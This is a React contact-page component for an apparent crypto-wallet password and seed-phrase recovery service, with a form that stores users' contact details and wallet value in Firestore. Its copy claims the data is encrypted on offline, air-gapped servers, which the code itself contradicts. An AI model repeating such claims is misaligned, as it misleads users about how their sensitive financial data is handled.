import { useState } from "react";
import { db } from "../firebase";

import { collection, addDoc } from "firebase/firestore";
import {
  FaLock,
  FaShieldAlt,
  FaDollarSign,
  FaCheckCircle,
  FaArrowRight,
  FaUser,
  FaEnvelope,
  FaPhone,
  FaGlobe,
  FaWallet,
  FaBitcoin,
  FaPaperPlane,
} from "react-icons/fa";
const InputField = ({
  label,
  name,
  type = "text",
  placeholder,
  icon: Icon,
  required = true,
  formData,
  handleChange,
}) => (
  <div className="group  ">
    <label className="block mb-2 text-sm font-semibold text-gray-700 dark:text-gray-300">
      {label} {required && <span className="text-red-500">*</span>}
    </label>
    <div className="relative">
      {Icon && (
        <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 group-hover:text-blue-500 transition-colors duration-300">
          <Icon className="text-lg" />
        </div>
      )}
      <input
        type={type}
        name={name}
        value={formData[name]}
        onChange={handleChange}
        placeholder={placeholder}
        className={`w-full border-2 rounded-xl px-5 py-3.5 outline-none transition-all duration-300
            ${Icon ? "pl-12" : "pl-5"}
           border-gray-200 dark:border-gray-700 focus:border-blue-500
            bg-white dark:bg-gray-900 text-gray-900 dark:text-white`}
      />
    </div>
  </div>
);

function Contact() {
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    country: "",
    email: "",
    phone: "",
    recoveryType: "",
    walletType: "",
    walletValue: "",
    message: "",
    agree: false,
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setIsSubmitting(true);

      await addDoc(collection(db, "contacts"), {
        ...formData,
        createdAt: new Date(),
      });

      setIsSubmitting(false);
      setIsSubmitted(true);

      setFormData({
        firstName: "",
        lastName: "",
        country: "",
        email: "",
        phone: "",
        recoveryType: "",
        walletType: "",
        walletValue: "",
        message: "",
        agree: false,
      });

      setTimeout(() => setIsSubmitted(false), 5000);
    } catch (error) {
      console.log(error);
      setIsSubmitting(false);
    }
  };

  const features = [
    {
      icon: <FaShieldAlt className="text-xl" />,
      title: "Trusted wallet recovery",
      desc: "The most trusted name in digital asset recovery since 2017.",
      color: "from-blue-500 to-cyan-500",
    },
    {
      icon: <FaLock className="text-xl" />,
      title: "Secure Air-Gapped Storage",
      desc: "All wallet and password data is encrypted and stored on offline, air-gapped servers.",
      color: "from-purple-500 to-pink-500",
    },
    {
      icon: <FaDollarSign className="text-xl" />,
      title: "Start for Free",
      desc: "A no-risk guarantee that you won't pay us a dime if we can't recover your password.",
      color: "from-green-500 to-emerald-500",
    },
  ];
  const SelectField = ({
    label,
    name,
    options,
    icon: Icon,
    formData,
    handleChange,
  }) => (
    <div className="group  ">
      <label className="block mb-2 text-sm font-semibold text-gray-700 dark:text-gray-300">
        {label} <span className="text-red-500">*</span>
      </label>
      <div className="relative">
        {Icon && (
          <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 group-hover:text-blue-500 transition-colors duration-300">
            <Icon className="text-lg" />
          </div>
        )}
        <select
          name={name}
          value={formData[name]}
          onChange={handleChange}
          className={`w-full border-2 rounded-xl px-5 py-3.5 outline-none transition-all duration-300 appearance-none
            ${Icon ? "pl-12" : "pl-5"}
           border-gray-200 dark:border-gray-700 focus:border-blue-500
            bg-white dark:bg-gray-900 text-gray-900 dark:text-white cursor-pointer`}
        >
          <option value="">Select...</option>
          {options.map((opt) => (
            <option key={opt} value={opt}>
              {opt}
            </option>
          ))}
        </select>
        <div className="absolute right-4 top-1/2 transform -translate-y-1/2 pointer-events-none">
          <svg
            className="w-5 h-5 text-gray-400"
            fill="none"
            stroke="currentColor"
            viewBox="0 0 24 24"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M19 9l-7 7-7-7"
            />
          </svg>
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-white dark:from-black dark:to-gray-900 overflow-hidden">
      {/* Success Toast */}
      {isSubmitted && (
        <div className="fixed top-24 right-6 z-50   ">
          <div className="bg-green-500 text-white px-6 py-4 rounded-xl shadow-2xl flex items-center gap-3">
            <FaCheckCircle className="text-xl" />
            <div>
              <p className="font-semibold">Message Sent!</p>
              <p className="text-sm opacity-90">
                We'll respond within 24 hours
              </p>
            </div>
          </div>
        </div>
      )}

      <div className="grid lg:grid-cols-2 min-h-screen">
        {/* LEFT SIDE - Modern Dark Theme */}
        <div className="relative overflow-hidden bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 text-white px-8 md:px-14 py-20 flex flex-col justify-between">
          {/* Animated Background */}
          {/* <div className="absolute inset-0">
            <div className="absolute top-20 left-20 w-72 h-72 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
            <div className="absolute bottom-20 right-20 w-72 h-72 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>
            <div className="absolute top-1/2 left-1/2 w-72 h-72 bg-pink-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-4000"></div>
          </div> */}

          <div className="relative z-10">
            <div className=" ">
              <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-4 py-2 rounded-full mb-8">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium">
                  24/7 SUPPORT AVAILABLE
                </span>
              </div>
            </div>

            <h1 className="text-5xl md:text-6xl lg:text-7xl font-bold leading-tight mb-6   animation-delay-200">
              Talk to our
              <br />
              <span className="bg-gradient-to-r from-blue-400 via-cyan-400 to-purple-400 bg-clip-text text-transparent">
                support team
              </span>
            </h1>

            <p className="text-lg text-gray-200 leading-relaxed mb-16 max-w-xl   animation-delay-400">
              Contact us to recover the password or seed phrase to your locked
              crypto wallet. Our friendly team would love to hear from you.
            </p>

            {/* Features */}
            <div className="space-y-8">
              {features.map((feature, idx) => (
                <div key={idx} className="flex items-start gap-5 group   ">
                  <div
                    className={`w-14 h-14 rounded-xl bg-gradient-to-br ${feature.color} flex items-center justify-center shadow-lg transform group-hover:scale-110 transition-all duration-300`}
                  >
                    {feature.icon}
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold mb-2 group-hover:text-blue-300 transition-colors">
                      {feature.title}
                    </h3>
                    <p className="text-gray-300 leading-relaxed">
                      {feature.desc}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Featured In */}
          <div className="relative z-10 mt-20   animation-delay-1000">
            <p className="uppercase tracking-[4px] text-blue-300 text-sm mb-6">
              Featured In
            </p>
            <div className="flex gap-8 text-3xl md:text-4xl font-bold text-gray-300 flex-wrap">
              {["BBC", "Forbes", "VICE", "The Block"].map((pub, idx) => (
                <span
                  key={idx}
                  className="hover:text-white hover:scale-110 transition-all duration-300 cursor-pointer"
                >
                  {pub}
                </span>
              ))}
            </div>
          </div>

          {/* Floating Elements */}
          <div className="absolute bottom-10 left-10 w-2 h-2 bg-white rounded-full animate-float"></div>
          <div className="absolute top-1/3 right-10 w-3 h-3 bg-white/50 rounded-full animate-float animation-delay-1000"></div>
        </div>

        {/* RIGHT SIDE - Modern Form */}
        <div className="bg-white dark:bg-gray-900 px-8 md:px-14 py-20 overflow-y-auto">
          <div className="max-w-xl mx-auto">
            <div className="text-center mb-10  ">
              <div className="inline-flex items-center gap-2 bg-gray-100 dark:bg-gray-800 px-4 py-2 rounded-full mb-4">
                <FaPaperPlane className="text-blue-500 text-sm" />
                <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
                  GET IN TOUCH
                </span>
              </div>
              <h2 className="text-3xl font-bold text-gray-900 dark:text-white">
                Start your recovery
              </h2>
              <p className="text-gray-600 dark:text-gray-400 mt-2">
                Fill out the form and we'll get back to you within 24 hours
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="grid md:grid-cols-2 gap-5">
                <InputField
                  label="First Name"
                  name="firstName"
                  placeholder="John"
                  icon={FaUser}
                  formData={formData}
                  handleChange={handleChange}
                />
                <InputField
                  label="Last Name"
                  name="lastName"
                  placeholder="Doe"
                  icon={FaUser}
                  formData={formData}
                  handleChange={handleChange}
                />
              </div>
              <SelectField
                label="Country"
                name="country"
                options={[
                  "Afghanistan",
                  "Albania",
                  "Algeria",
                  "Argentina",
                  "Australia",
                  "Austria",
                  "Bangladesh",
                  "Belgium",
                  "Brazil",
                  "Canada",
                  "China",
                  "Denmark",
                  "Egypt",
                  "Finland",
                  "France",
                  "Germany",
                  "Greece",
                  "Hong Kong",
                  "Hungary",
                  "India",
                  "Indonesia",
                  "Iran",
                  "Iraq",
                  "Ireland",
                  "Israel",
                  "Italy",
                  "Japan",
                  "Kenya",
                  "Malaysia",
                  "Mexico",
                  "Nepal",
                  "Netherlands",
                  "New Zealand",
                  "Nigeria",
                  "Norway",
                  "Pakistan",
                  "Philippines",
                  "Poland",
                  "Portugal",
                  "Qatar",
                  "Russia",
                  "Saudi Arabia",
                  "Singapore",
                  "South Africa",
                  "South Korea",
                  "Spain",
                  "Sri Lanka",
                  "Sweden",
                  "Switzerland",
                  "Thailand",
                  "Turkey",
                  "UAE",
                  "UK",
                  "Ukraine",
                  "USA",
                  "Vietnam",
                  "Zimbabwe",
                ]}
                icon={FaGlobe}
                formData={formData}
                handleChange={handleChange}
              />

              <div className="grid md:grid-cols-2 gap-5">
                <InputField
                  label="Email"
                  name="email"
                  type="email"
                  placeholder="john@example.com"
                  icon={FaEnvelope}
                  formData={formData}
                  handleChange={handleChange}
                />
                <InputField
                  label="Phone Number"
                  name="phone"
                  type="tel"
                  placeholder="+1 (555) 000-0000"
                  icon={FaPhone}
                  formData={formData}
                  handleChange={handleChange}
                />
              </div>

              <SelectField
                label="Recovery Type"
                name="recoveryType"
                options={[
                  "Password Recovery",
                  "Seed Phrase Recovery",
                  "Wallet Access",
                  "Private Key Recovery",
                ]}
                icon={FaShieldAlt}
                formData={formData}
                handleChange={handleChange}
              />

              <div className="grid md:grid-cols-2 gap-5">
                <SelectField
                  label="Wallet Type"
                  name="walletType"
                  options={[
                    "MetaMask",
                    "Trust Wallet",
                    "Blockchain.com",
                    "Bitcoin Core",
                    "Ledger",
                    "Trezor",
                    "Exodus",
                    "Electrum",
                  ]}
                  icon={FaWallet}
                  formData={formData}
                  handleChange={handleChange}
                />
                <InputField
                  label="Wallet Value (USD)"
                  name="walletValue"
                  type="number"
                  placeholder="Estimated value"
                  icon={FaBitcoin}
                  formData={formData}
                  handleChange={handleChange}
                />
              </div>

              <div className=" ">
                <label className="block mb-2 text-sm font-semibold text-gray-700 dark:text-gray-300">
                  Message <span className="text-red-500">*</span>
                </label>
                <textarea
                  name="message"
                  value={formData.message}
                  onChange={handleChange}
                  rows="5"
                  placeholder="Tell us about your wallet issue..."
                  className={`w-full border-2 rounded-xl px-5 py-3.5 outline-none transition-all duration-300 resize-none
                    border-gray-200 dark:border-gray-700 focus:border-blue-500
                    bg-white dark:bg-gray-900 text-gray-900 dark:text-white`}
                />
              </div>

              <div className="flex items-center gap-3  ">
                <input
                  type="checkbox"
                  name="agree"
                  checked={formData.agree}
                  onChange={handleChange}
                  className="w-5 h-5 rounded border-gray-300 text-blue-600 focus:ring-blue-500"
                />
                <label className="text-gray-700 dark:text-gray-300 text-sm">
                  You agree to our{" "}
                  <span className="text-blue-600 underline cursor-pointer hover:text-blue-700">
                    privacy policy
                  </span>
                  .
                </label>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="group relative w-full bg-gradient-to-r from-blue-600 via-purple-600 to-pink-600 text-white py-4 rounded-xl font-semibold text-lg overflow-hidden shadow-lg shadow-blue-500/30 hover:shadow-xl transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-70 disabled:cursor-not-allowed"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-pink-600 via-purple-600 to-blue-600 opacity-0 group-hover:opacity-100 transition-opacity duration-500"></div>
                <span className="relative flex items-center justify-center gap-2">
                  {isSubmitting ? (
                    <>
                      <svg
                        className="animate-spin h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      Sending...
                    </>
                  ) : (
                    <>
                      Send Message
                      <FaArrowRight className="group-hover:translate-x-1 transition-transform" />
                    </>
                  )}
                </span>
              </button>

              <p className="text-center text-xs text-gray-500 dark:text-gray-500 mt-6">
                We'll never share your information. Promise.
              </p>
            </form>
          </div>
        </div>
      </div>

      {/* <style jsx>{`
        @keyframes fadeInUp {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        @keyframes slideInLeft {
          from {
            opacity: 0;
            transform: translateX(-30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes slideInRight {
          from {
            opacity: 0;
            transform: translateX(30px);
          }
          to {
            opacity: 1;
            transform: translateX(0);
          }
        }

        @keyframes blob {
          0%,
          100% {
            transform: translate(0px, 0px) scale(1);
          }
          33% {
            transform: translate(30px, -50px) scale(1.1);
          }
          66% {
            transform: translate(-20px, 20px) scale(0.9);
          }
        }

        @keyframes float {
          0%,
          100% {
            transform: translateY(0px);
          }
          50% {
            transform: translateY(-20px);
          }
        }

        .  {
          animation: fadeInUp 0.6s ease-out forwards;
          opacity: 0;
        }

        .animate-slideInLeft {
          animation: slideInLeft 0.6s ease-out forwards;
          opacity: 0;
        }

        .animate-slideInRight {
          animation: slideInRight 0.4s ease-out forwards;
        }

        .animate-blob {
          animation: blob 7s infinite;
        }

        .animate-float {
          animation: float 3s ease-in-out infinite;
        }

        .animation-delay-200 {
          animation-delay: 0.2s;
        }

        .animation-delay-400 {
          animation-delay: 0.4s;
        }

        .animation-delay-600 {
          animation-delay: 0.6s;
        }

        .animation-delay-1000 {
          animation-delay: 1s;
        }

        .animation-delay-2000 {
          animation-delay: 2s;
        }

        .animation-delay-4000 {
          animation-delay: 4s;
        }
      `}</style> */}
    </div>
  );
}

export default Contact;
